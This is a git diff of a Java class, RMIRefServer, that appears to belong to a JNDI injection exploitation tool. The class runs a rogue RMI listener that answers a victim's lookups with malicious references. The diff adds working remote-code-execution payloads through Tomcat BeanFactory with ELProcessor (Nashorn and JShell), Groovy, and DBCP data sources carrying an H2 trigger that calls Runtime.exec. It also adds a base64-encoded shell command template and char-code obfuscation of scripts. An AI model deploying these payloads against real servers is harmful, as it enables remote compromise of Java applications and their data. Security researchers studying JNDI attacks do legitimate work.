@@ -1,8 +1,5 @@
 package jndi;
 
-
-import static run.ServerStart.getLocalTime;
-
 import java.io.BufferedInputStream;
 import java.io.BufferedOutputStream;
 import java.io.DataInputStream;
@@ -26,42 +23,47 @@ import java.rmi.RemoteException;
 import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObject;
 import java.rmi.server.UID;
+import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Base64;
 
-import javax.naming.*;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import javax.naming.StringRefAddr;
 import javax.net.ServerSocketFactory;
 
 import org.apache.naming.ResourceRef;
 
-import com.sun.jndi.rmi.registry.*;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
 
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import static run.ServerStart.getLocalTime;
 import sun.rmi.server.UnicastServerRef;
 import sun.rmi.transport.TransportConstants;
 import util.Mapper;
 import util.Reflections;
 
-import java.util.Base64;
-
-
 /**
  * Generic JRMP listener
- * 
- * JRMP Listener that will respond to RMI lookups with a Reference that specifies a remote object factory.
- * 
- * This technique was mitigated against by no longer allowing remote codebases in references by default in Java 8u121.
- * 
+ *
+ * JRMP Listener that will respond to RMI lookups with a Reference that
+ * specifies a remote object factory.
+ *
+ * This technique was mitigated against by no longer allowing remote codebases
+ * in references by default in Java 8u121.
+ *
  * @author mbechler welkin
  *
  */
-@SuppressWarnings ( {
+@SuppressWarnings({
     "restriction"
-} )
+})
 public class RMIRefServer implements Runnable {
 
     public String command;
+    public String customScript;
 
     private int port;
     private ServerSocket ss;
@@ -70,56 +72,52 @@ public class RMIRefServer implements Runnable {
     private boolean hadConnection;
     private URL classpathUrl;
 
-
-    public RMIRefServer ( int port, URL classpathUrl ) throws IOException {
+    public RMIRefServer(int port, URL classpathUrl) throws IOException {
         this.port = port;
         this.classpathUrl = classpathUrl;
         this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
     }
 
-    public RMIRefServer ( int port, URL classpathUrl, String command) throws IOException {
+    public RMIRefServer(int port, URL classpathUrl, String command) throws IOException {
         this.port = port;
         this.classpathUrl = classpathUrl;
         this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
         this.command = command;
     }
 
-    public boolean waitFor ( int i ) {
+    public boolean waitFor(int i) {
         try {
-            if ( this.hadConnection ) {
+            if (this.hadConnection) {
                 return true;
             }
             System.out.println(getLocalTime() + " [RMISERVER]  >> Waiting for connection");
-            synchronized ( this.waitLock ) {
+            synchronized (this.waitLock) {
                 this.waitLock.wait(i);
             }
             return this.hadConnection;
-        }
-        catch ( InterruptedException e ) {
+        } catch (InterruptedException e) {
             return false;
         }
     }
 
-
     /**
-     * 
+     *
      */
-    public void close () {
+    public void close() {
         this.exit = true;
         try {
             this.ss.close();
+        } catch (IOException e) {
         }
-        catch ( IOException e ) {}
-        synchronized ( this.waitLock ) {
+        synchronized (this.waitLock) {
             this.waitLock.notify();
         }
     }
 
-
-    public static final void main ( final String[] args ) {
+    public static final void main(final String[] args) {
         int port = 1099;
         String codebase = "http://testlocal.com:8080/";
-        if ( args.length >= 2 ) {
+        if (args.length >= 2) {
             port = Integer.parseInt(args[1]);
             codebase = args[2];
         }
@@ -127,7 +125,7 @@ public class RMIRefServer implements Runnable {
         //trigger static code in Mapper
         try {
             Class.forName("util.Mapper");
-        }catch (ClassNotFoundException e){
+        } catch (ClassNotFoundException e) {
             e.printStackTrace();
         }
 
@@ -135,20 +133,19 @@ public class RMIRefServer implements Runnable {
             System.out.println(getLocalTime() + " [RMISERVER] STANDALONE MODE >> Opening JRMP listener on " + port + " with codebase pointing to " + codebase);
             RMIRefServer c = new RMIRefServer(port, new URL(codebase));
             c.run();
-        } catch ( Exception e ) {
+        } catch (Exception e) {
             System.out.println(getLocalTime() + " [RMISERVER] STANDALONE MODE >> Listener error");
             e.printStackTrace(System.err);
         }
     }
 
-
     @Override
-    public void run () {
+    public void run() {
         try {
-            @SuppressWarnings ( "resource" )
+            @SuppressWarnings("resource")
             Socket s = null;
             try {
-                while ( !this.exit && ( s = this.ss.accept() ) != null ) {
+                while (!this.exit && (s = this.ss.accept()) != null) {
                     try {
                         s.setSoTimeout(5000);
                         InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
@@ -159,124 +156,112 @@ public class RMIRefServer implements Runnable {
 
                         // Read magic (or HTTP wrapper)
                         bufIn.mark(4);
-                        try ( DataInputStream in = new DataInputStream(bufIn) ) {
+                        try (DataInputStream in = new DataInputStream(bufIn)) {
                             int magic = in.readInt();
 
                             short version = in.readShort();
-                            if ( magic != TransportConstants.Magic || version != TransportConstants.Version ) {
+                            if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
                                 s.close();
                                 continue;
                             }
 
                             OutputStream sockOut = s.getOutputStream();
                             BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
-                            try ( DataOutputStream out = new DataOutputStream(bufOut) ) {
+                            try (DataOutputStream out = new DataOutputStream(bufOut)) {
 
                                 byte protocol = in.readByte();
-                                switch ( protocol ) {
-                                case TransportConstants.StreamProtocol:
-                                    out.writeByte(TransportConstants.ProtocolAck);
-                                    if ( remote.getHostName() != null ) {
-                                        out.writeUTF(remote.getHostName());
-                                    }
-                                    else {
-                                        out.writeUTF(remote.getAddress().toString());
-                                    }
-                                    out.writeInt(remote.getPort());
-                                    out.flush();
-                                    in.readUTF();
-                                    in.readInt();
-                                case TransportConstants.SingleOpProtocol:
-                                    doMessage(s, in, out);
-                                    break;
-                                default:
-                                case TransportConstants.MultiplexProtocol:
-                                    System.out.println(getLocalTime() + " [RMISERVER]  >> Unsupported protocol");
-                                    s.close();
-                                    continue;
+                                switch (protocol) {
+                                    case TransportConstants.StreamProtocol:
+                                        out.writeByte(TransportConstants.ProtocolAck);
+                                        if (remote.getHostName() != null) {
+                                            out.writeUTF(remote.getHostName());
+                                        } else {
+                                            out.writeUTF(remote.getAddress().toString());
+                                        }
+                                        out.writeInt(remote.getPort());
+                                        out.flush();
+                                        in.readUTF();
+                                        in.readInt();
+                                    case TransportConstants.SingleOpProtocol:
+                                        doMessage(s, in, out);
+                                        break;
+                                    default:
+                                    case TransportConstants.MultiplexProtocol:
+                                        System.out.println(getLocalTime() + " [RMISERVER]  >> Unsupported protocol");
+                                        s.close();
+                                        continue;
                                 }
 
                                 bufOut.flush();
                                 out.flush();
                             }
                         }
-                    }
-                    catch ( InterruptedException e ) {
+                    } catch (InterruptedException e) {
                         return;
-                    }
-                    catch ( Exception e ) {
+                    } catch (Exception e) {
                         e.printStackTrace(System.err);
-                    }
-                    finally {
+                    } finally {
                         System.out.println(getLocalTime() + " [RMISERVER]  >> Closing connection");
                         s.close();
                     }
 
                 }
 
-            }
-            finally {
-                if ( s != null ) {
+            } finally {
+                if (s != null) {
                     s.close();
                 }
-                if ( this.ss != null ) {
+                if (this.ss != null) {
                     this.ss.close();
                 }
             }
 
-        }
-        catch ( SocketException e ) {
+        } catch (SocketException e) {
             return;
-        }
-        catch ( Exception e ) {
+        } catch (Exception e) {
             e.printStackTrace(System.err);
         }
     }
 
-
-    private void doMessage ( Socket s, DataInputStream in, DataOutputStream out ) throws Exception {
+    private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
         System.out.println(getLocalTime() + " [RMISERVER]  >> Reading message...");
 
         int op = in.read();
 
-        switch ( op ) {
-        case TransportConstants.Call:
-            // service incoming RMI call
-            doCall(in, out);
-            break;
+        switch (op) {
+            case TransportConstants.Call:
+                // service incoming RMI call
+                doCall(in, out);
+                break;
 
-        case TransportConstants.Ping:
-            // send ack for ping
-            out.writeByte(TransportConstants.PingAck);
-            break;
+            case TransportConstants.Ping:
+                // send ack for ping
+                out.writeByte(TransportConstants.PingAck);
+                break;
 
-        case TransportConstants.DGCAck:
-            UID.read(in);
-            break;
+            case TransportConstants.DGCAck:
+                UID.read(in);
+                break;
 
-        default:
-            throw new IOException(getLocalTime() + " [RMISERVER]  >> unknown transport op " + op);
+            default:
+                throw new IOException(getLocalTime() + " [RMISERVER]  >> unknown transport op " + op);
         }
 
         s.close();
     }
 
-
-    private void doCall ( DataInputStream in, DataOutputStream out ) throws Exception {
+    private void doCall(DataInputStream in, DataOutputStream out) throws Exception {
         ObjectInputStream ois = new ObjectInputStream(in) {
 
             @Override
-            protected Class<?> resolveClass ( ObjectStreamClass desc ) throws IOException, ClassNotFoundException {
-                if ( "[Ljava.rmi.jndi.ObjID;".equals(desc.getName()) ) {
+            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+                if ("[Ljava.rmi.jndi.ObjID;".equals(desc.getName())) {
                     return ObjID[].class;
-                }
-                else if ( "java.rmi.jndi.ObjID".equals(desc.getName()) ) {
+                } else if ("java.rmi.jndi.ObjID".equals(desc.getName())) {
                     return ObjID.class;
-                }
-                else if ( "java.rmi.jndi.UID".equals(desc.getName()) ) {
+                } else if ("java.rmi.jndi.UID".equals(desc.getName())) {
                     return UID.class;
-                }
-                else if ( "java.lang.String".equals(desc.getName()) ) {
+                } else if ("java.lang.String".equals(desc.getName())) {
                     return String.class;
                 }
                 throw new IOException(getLocalTime() + " [RMISERVER]  >> Not allowed to read object");
@@ -286,19 +271,17 @@ public class RMIRefServer implements Runnable {
         ObjID read;
         try {
             read = ObjID.read(ois);
-        }
-        catch ( IOException e ) {
+        } catch (IOException e) {
             throw new MarshalException(getLocalTime() + " [RMISERVER]  >> unable to read objID", e);
         }
 
-        if ( read.hashCode() == 2 ) {
+        if (read.hashCode() == 2) {
             // DGC
             handleDGC(ois);
-        }
-        else if ( read.hashCode() == 0 ) {
-            if ( handleRMI(ois, out) ) {
+        } else if (read.hashCode() == 0) {
+            if (handleRMI(ois, out)) {
                 this.hadConnection = true;
-                synchronized ( this.waitLock ) {
+                synchronized (this.waitLock) {
                     this.waitLock.notifyAll();
                 }
                 return;
@@ -307,19 +290,17 @@ public class RMIRefServer implements Runnable {
 
     }
 
-
     /**
      * @param ois
      * @param out
      * @throws IOException
-     * @throws ClassNotFoundException
-//     * @throws NamingException
+     * @throws ClassNotFoundException // * @throws NamingException
      */
-    private boolean handleRMI ( ObjectInputStream ois, DataOutputStream out ) throws Exception {
+    private boolean handleRMI(ObjectInputStream ois, DataOutputStream out) throws Exception {
         int method = ois.readInt(); // method
         ois.readLong(); // hash
 
-        if ( method != 2 ) { // lookup
+        if (method != 2) { // lookup
             return false;
         }
 
@@ -331,27 +312,37 @@ public class RMIRefServer implements Runnable {
 
         if (reference == null) {
             System.out.println(getLocalTime() + " [RMISERVER]  >> Reference that matches the name(" + object + ") is not found.");
-            //return false;
-            cpstring = "BypassByGroovy";
+            return false;
         }
         URL turl = new URL(cpstring + "#" + reference);
         out.writeByte(TransportConstants.Return);// transport op
-        try ( ObjectOutputStream oos = new MarshalOutputStream(out, turl) ) {
+        try (ObjectOutputStream oos = new MarshalOutputStream(out, turl)) {
 
             oos.writeByte(TransportConstants.NormalReturn);
             new UID().write(oos);
 
             ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
 
-            if (reference.startsWith("BypassByEL")){
+            if (reference.startsWith("BypassByEL")) {
                 System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference for BypassByEL.");
-                Reflections.setFieldValue(rw, "wrappee", execByEL());
+                Reflections.setFieldValue(rw, "wrappee", execByJavaxELNashomTomcatOld());
 
-            } else if (reference.startsWith("BypassByGroovy")){
+            } else if (reference.startsWith("BypassByGroovy")) {
                 System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference for BypassByGroovy.");
                 Reflections.setFieldValue(rw, "wrappee", execByGroovy());
-            }
-            else {
+            } else if (reference.startsWith("BypassDbcp1Tomcat")) {
+                System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference for BypassDbcp1Tomcat.");
+                Reflections.setFieldValue(rw, "wrappee", tomcat_dbcp1_RCE());
+            } else if (reference.startsWith("BypassDbcp2Tomcat")) {
+                System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference for BypassDbcp2Tomcat.");
+                Reflections.setFieldValue(rw, "wrappee", tomcat_dbcp2_RCE());
+            } else if (reference.startsWith("BypassDbcp1Commons")) {
+                System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference for BypassDbcp1Commons.");
+                Reflections.setFieldValue(rw, "wrappee", commons_dbcp1_RCE());
+            } else if (reference.startsWith("BypassDbcp2Commons")) {
+                System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference for BypassDbcp2Commons.");
+                Reflections.setFieldValue(rw, "wrappee", commons_dbcp2_RCE());
+            } else {
                 System.out.println(
                         String.format(
                                 getLocalTime() + " [RMISERVER]  >> Sending remote classloading stub targeting %s",
@@ -370,70 +361,145 @@ public class RMIRefServer implements Runnable {
         }
         return true;
     }
-    
-    public String getBase64CommandTpl(){
-        return "bash -c {echo," +
-                Base64.getEncoder().encodeToString(this.command.getBytes()) +
-                "}|{base64,-d}|{bash,-i}";
+
+    public String getBase64CommandTpl() {
+        return "sh -c {echo,"
+                + Base64.getEncoder().encodeToString(this.command.getBytes())
+                + "}|{base64,-d}|{sh,-i}";
+    }
+
+    public String getDefaultScriptCmdExec() {
+        return String.format(
+                "var os = java.lang.System.getProperty('os.name'); "
+                + "var cmd = '%s'; "
+                + "var proc = null; "
+                + "os.toLowerCase().contains('win')? "
+                + "java.lang.Runtime.getRuntime().exec(['cmd.exe', '/C', cmd]) "
+                + ": java.lang.Runtime.getRuntime().exec(['/bin/sh', '-c', cmd]);", this.command);
+    }
+
+    public static String makeJavaScriptString(String str) {
+
+        ArrayList<String> result = new ArrayList<>(str.length());
+        for (int i = 0; i < str.length(); i++) {
+            Integer x = Character.codePointAt(str, i);
+            result.add(x.toString());
+        }
+        return "String.fromCharCode(" + String.join(",", result) + ")";
     }
 
     /*
      * Need : Tomcat 8+ or SpringBoot 1.2.x+ in classpath，because of javax.el.ELProcessor.
      */
-    public ResourceRef execByEL() {
-        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
+    public ResourceRef execByJavaxELNashomTomcatOld() {
+        String payload = String.format(
+                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"eval(%s)\")",
+                (this.customScript.isEmpty()) ? makeJavaScriptString(getDefaultScriptCmdExec()) : makeJavaScriptString(this.customScript)
+        );
+        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
-        ref.add(new StringRefAddr("x", String.format(
-                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" 
-                         + "\"var os = java.lang.System.getProperty('os.name'); "
-                         + "var cmd = '%s'; "
-                         + "var proc = null; "
-                         + "os.toLowerCase().contains('win')? "
-                         + "java.lang.Runtime.getRuntime().exec(['cmd.exe', '/C', cmd]) "
-                         + ": java.lang.Runtime.getRuntime().exec(['/bin/bash', '-c', cmd]);\"" +
-                         ")",
-                 this.command
-         )));
+        ref.add(new StringRefAddr("x", payload));
 
         return ref;
     }
-    
+
+    /*
+     * Need : Tomcat 10.0.x or earlier with forcestring available
+     */
+    public ResourceRef execByJakartaELJshellTomcatNew() {
+        String payload = String.format(
+                "\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"eval(%s)\")",
+                (this.customScript.isEmpty()) ? makeJavaScriptString(getDefaultScriptCmdExec()) : makeJavaScriptString(this.customScript)
+        );
+        ResourceRef ref = new ResourceRef("jakarta.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
+        ref.add(new StringRefAddr("forceString", "x=eval"));
+        ref.add(new StringRefAddr("x", payload));
+
+        return ref;
+    }
+
+    /*
+     * Need : Tomcat 10.0.x or earlier with forcestring available
+     */
+    public ResourceRef xxeTomcatRef() {
+        String payload = String.format(
+                "\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"eval(%s)\")",
+                (this.customScript.isEmpty()) ? makeJavaScriptString(getDefaultScriptCmdExec()) : makeJavaScriptString(this.customScript)
+        );
+        ResourceRef ref = new ResourceRef("jakarta.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
+        ref.add(new StringRefAddr("forceString", "x=eval"));
+        ref.add(new StringRefAddr("x", payload));
+
+        return ref;
+    }
+
+    private ResourceRef tomcat_dbcp2_RCE() {
+        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory");
+    }
+
+    private ResourceRef tomcat_dbcp1_RCE() {
+        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory");
+    }
+
+    private ResourceRef commons_dbcp2_RCE() {
+        return dbcpByFactory("org.apache.commons.dbcp2.BasicDataSourceFactory");
+    }
+
+    private ResourceRef commons_dbcp1_RCE() {
+        return dbcpByFactory("org.apache.commons.dbcp.BasicDataSourceFactory");
+    }
+
+    private ResourceRef dbcpByFactory(String factory) {
+        ResourceRef ref = new ResourceRef("javax.sql.DataSource", null, "", "", true, factory, null);
+        String JDBC_URL = String.format(
+                "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n"
+                + "INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
+                + "java.lang.Runtime.getRuntime().exec('%s')\n"
+                + "$$\n", getBase64CommandTpl()
+        );
+        ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
+        ref.add(new StringRefAddr("url", JDBC_URL));
+        ref.add(new StringRefAddr("username", "root"));
+        ref.add(new StringRefAddr("password", "password"));
+        ref.add(new StringRefAddr("initialSize", "1"));
+        return ref;
+    }
+
+
     /*
      * Need : Tomcat and groovy in classpath.
      * Created by Orange Tsai @orangetw
      */
-    public ResourceRef execByGroovy() throws RemoteException, NamingException{
+    public ResourceRef execByGroovy() throws RemoteException, NamingException {
         ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=evaluate"));
         String script = String.format("'%s'.execute()", getBase64CommandTpl());
-        ref.add(new StringRefAddr("x",script));
+        ref.add(new StringRefAddr("x", script));
         return ref;
     }
-
 
     /**
      * @param ois
      * @throws IOException
      * @throws ClassNotFoundException
      */
-    private static void handleDGC ( ObjectInputStream ois ) throws IOException, ClassNotFoundException {
+    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
         ois.readInt(); // method
         ois.readLong(); // hash
         System.out.println(getLocalTime() + " [RMISERVER]  >> Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
     }
 
-
-    @SuppressWarnings ( "deprecation" )
-    protected static Object makeDummyObject ( String className ) {
+    @SuppressWarnings("deprecation")
+    protected static Object makeDummyObject(String className) {
         try {
-            ClassLoader isolation = new ClassLoader() {};
+            ClassLoader isolation = new ClassLoader() {
+            };
             ClassPool cp = new ClassPool();
             cp.insertClassPath(new ClassClassPath(Dummy.class));
             CtClass clazz = cp.get(Dummy.class.getName());
             clazz.setName(className);
             return clazz.toClass(isolation).newInstance();
-        }
-        catch ( Exception e ) {
+        } catch (Exception e) {
             e.printStackTrace();
             return new byte[0];
         }
@@ -449,43 +515,37 @@ public class RMIRefServer implements Runnable {
 
         private URL sendUrl;
 
-
-        public MarshalOutputStream ( OutputStream out, URL u ) throws IOException {
+        public MarshalOutputStream(OutputStream out, URL u) throws IOException {
             super(out);
             this.sendUrl = u;
         }
 
-
-        MarshalOutputStream ( OutputStream out ) throws IOException {
+        MarshalOutputStream(OutputStream out) throws IOException {
             super(out);
         }
 
-
         @Override
-        protected void annotateClass ( Class<?> cl ) throws IOException {
-            if ( this.sendUrl != null ) {
+        protected void annotateClass(Class<?> cl) throws IOException {
+            if (this.sendUrl != null) {
                 writeObject(this.sendUrl.toString());
-            }
-            else if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
+            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                 writeObject(null);
-            }
-            else {
-                URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
+            } else {
+                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();
                 String cb = "";
 
-                for ( URL u : us ) {
+                for (URL u : us) {
                     cb += u.toString();
                 }
                 writeObject(cb);
             }
         }
 
-
         /**
          * Serializes a location from which to load the specified class.
          */
         @Override
-        protected void annotateProxyClass ( Class<?> cl ) throws IOException {
+        protected void annotateProxyClass(Class<?> cl) throws IOException {
             annotateClass(cl);
         }
     }
